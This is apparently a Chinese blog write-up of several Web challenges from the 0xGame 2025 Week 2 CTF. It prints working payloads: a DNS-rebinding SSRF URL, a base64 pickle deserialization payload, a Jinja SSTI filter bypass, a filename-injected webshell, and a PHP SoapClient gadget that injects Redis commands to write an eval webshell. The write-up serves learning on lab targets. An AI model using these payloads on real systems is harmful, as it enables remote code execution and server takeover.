---
description: '记录 0xGame 2025 Week2 中几道 Web 题的分析、复现与踩坑点。'
title: 0xgame2025(week2
date: 2025-10-23T22:42:18Z
lastmod: 2025-10-25T20:16:09Z
top_img: /img/2abc3f959e3c1983556049fa213be07c.jpg
tags: [CTF,WP]
categories: [CTF,WP]
toc: true
toc_number: true
mathjax: false
katex: false
comments: true
---

# 0xgame2025（week2

## DNS想要玩

```python
from flask import Flask, request
from urllib.parse import urlparse
import socket
import os

app = Flask(__name__)

BlackList = [
    'localhost',
    '@',
    '172',
    'gopher',
    'file',
    'dict',
    'tcp',
    '0.0.0.0',
    '114.5.1.4'
]

def check(url):
    url = urlparse(url)
    host = url.hostname
    host_acscii = host.encode('idna').decode('utf-8')
    return socket.gethostbyname(host_acscii) == '114.5.1.4'

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/ssrf')
def ssrf():
    raw_url = request.args.get('url')
    if not raw_url:
        return 'URL Needed'
    for u in BlackList:
        if u in raw_url:
            return 'Invaild URL'
    if check(raw_url):
        return os.popen(request.args.get('cmd')).read()
    else:
        return "NONONO"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

就是要通过让hostname==114.5.1.4      数字绕过好像都不行，用的DNS 重绑定  
这个地址**https://lock.cmpxchg8b.com/rebinder.html**

​`payload：ssrf?url=http://72050104.c0a80001.rbndr.us&cmd=cat /flag`

## 你好，⽖洼脚本

丢控制台跑就行

## ⻢哈⻥商店

我们先注册，然后是一个购物界面

{% asset_img 8e38ded3-4842-49f1-8ea7-37257aeccecc-20251023234542-oxdbfe2.png 8e38ded3-4842-49f1-8ea7-37257aeccecc %}

我们抓包，发现我们买不起一些东西，我们买不起1个那我们就买半个，半个买不起我们就再减少

{% asset_img febd5499-5aa4-42b7-be0f-6c50c1538e70-20251023234743-94lckh5.png febd5499-5aa4-42b7-be0f-6c50c1538e70 %}

测得只有最后一个回显不一样

{% asset_img c9e7dfa0-099f-4638-aac5-08d0742a9faa-20251023234757-m4nt46i.png c9e7dfa0-099f-4638-aac5-08d0742a9faa %}

我们点进去获得这一串代码

```python
Use GET To Send Your Loved Data!!!      
BlackList = [b'\x00', b'\x1e']      
@app.route('/pickle_dsa')
 def pic():
 data = request.args.get('data')
 if not data:
 return "Use GET To Send Your Loved Data"
 try:
 data = base64.b64decode(data)
 except Exception:
 return "Cao!!!"
 for b in BlackList:
 if b in data:
 return "
卡了
"
 p = pickle.loads(data)
 print(p)
 return f"<p>Vamos! {p}<p>
```

pickle反序列化

```python
payload：/pickle_dsa?data=Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMie19faW1wb3J0X18oJ29zJykucG9wZW4oJ2VudicpLnJlYWQoKX0iCnAxCnRwMgpScDMKLg==
```

## 404NotFound

```python
dirsearch扫出这玩意发现没用
[11:41:49] Starting: 
[11:42:37] 200 -    2B  - /ping
[11:42:43] 404 -  207B  - /static/api/swagger.json
[11:42:43] 404 -  207B  - /static/api/swagger.yaml
[11:42:43] 404 -  207B  - /static/dump.sql
```

测半天原来是url的ssti

{% asset_img 9f50e2e6-d159-45dd-9eb2-a21e4ce677cc-20251024143651-eaignte 9f50e2e6-d159-45dd-9eb2-a21e4ce677cc %}

```python
过滤了sys, subprocess, eval, exec, lambda, input, init, class, 
set,.， from, flask, request, os, import, subclasses,dict, 
globals, locals, self, config, app, popen, file, templates
```

拼接绕

```python
{{lipsum['__glob'+'als__']['__bui'+'ltins__']['__imp'+'ort__']('o'+'s')['po'+'pen']('cat /f*')|attr('read')()}}
```

## 我只想要你的PNG！

源码里面有check.php,我们进去看看发现是目录

如何我们抓包传个png文件发现，check.php有显示目录

{% asset_img 408a063b-0400-4ac0-8352-c9d112efdd2c-20251024145225-8so4kqh.png 408a063b-0400-4ac0-8352-c9d112efdd2c %}

check.php的话既然是php文件那我们可以试试文件名写马（第一次遇到写在文件名的

{% asset_img 2e159130-65f4-42ec-9a95-be9259d142bc-20251024145334-ukmie49.png 2e159130-65f4-42ec-9a95-be9259d142bc %}

然后我们蚁剑连接一下这个check.php，获得flag

## 这真的是反序列化

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

//hint: Redis20251206

class pure{
    public $web;
    public $misc;
    public $crypto;
    public $pwn;

    public function __construct($web, $misc, $crypto, $pwn){
        $this->web = $web;
        $this->misc = $misc;
        $this->crypto = $crypto;
        $this->pwn = $pwn;
    }

    public function reverse(){
        $this->pwn = new $this->web($this->misc, $this->crypto);
    }

    public function osint(){
        $this->pwn->play_0xGame();
    }

    public function __destruct(){
        $this->reverse();
        $this->osint();
    }
}

$AI = $_GET['ai'];

$ctf = unserialize($AI);

?>
```

看到Redis的话应该是打ssrf，后面估计是密码，我们看看链子

```php
    public function osint(){
        $this->pwn->play_0xGame();
    }//这里调用了一个不存在的方法，那我们想到call()，那3应该是
```

那ssrf加上内置类我们想到了SoapClient类里面有call()方法，可以看看

{% asset_img 1c3bced2-a8ab-4de8-95a9-e5d08d8098a1-20251025190221-9jyb1d4.png 1c3bced2-a8ab-4de8-95a9-e5d08d8098a1 %}

链子应该还好就是触发SoapClient类

然后，然后就卡了（苦笑~，主播只是个会用gopherus的脚本小子，看官方wp

```php
<?php
 class pure
 {
 public $web;
 public $misc;
 public $crypto;
 public $pwn;
 } 
 $a = new pure();
 $a->web = 'SoapClient';
 $a->misc = null;
 $target = 'http://127.0.0.1:6379/';
 $poc = "AUTH 20251206\r\nCONFIG SET dir /var/www/html/\r\nCONFIG SET 
dbfilename shell.php\r\nSET x '<?= @eval(\$_POST[1]) ?>'\r\nSAVE";
 $a->crypto = array('location' => $target, 'uri' => "hello\"\r\n" . $poc . 
"\r\nhello");
 echo urlencode(serialize($a));//说实话第一眼只能看懂在写马
```

我们来看看$poc

```php
Redis 服务器的原始协议命令（这玩意说实话我第一次了解，主播还是太菜了
"AUTH 20251206\r\n" .                              // 登录密码就是20251206
"CONFIG SET dir /var/www/html/\r\n" .              // 设定工作目录（web 根）
"CONFIG SET dbfilename shell.php\r\n" .            // 设定持久化文件名
"SET x '<?= @eval(\$_POST[1]) ?>'\r\n" .           // 写马
"SAVE\r\n" .  //保存
```

然后要注意的点就是$target = 'http://127.0.0.1:6379/';这个是内网 Redis 地址

传参然后连蚁剑（磕磕碰碰终于做完了

{% asset_img 4fc71cfd-70df-4b9a-bb8b-cc4002b13dc2-20251025201231-09ajm6x.png 4fc71cfd-70df-4b9a-bb8b-cc4002b13dc2 %}

# 总结一下

这个拖了好久了，一直懒得去复现最后这个反序列化（主要是怕麻烦，懒癌这一块./

每次做题都能学到新知识就是了，希望自己不要那么懒了，希望这个是个新的开始

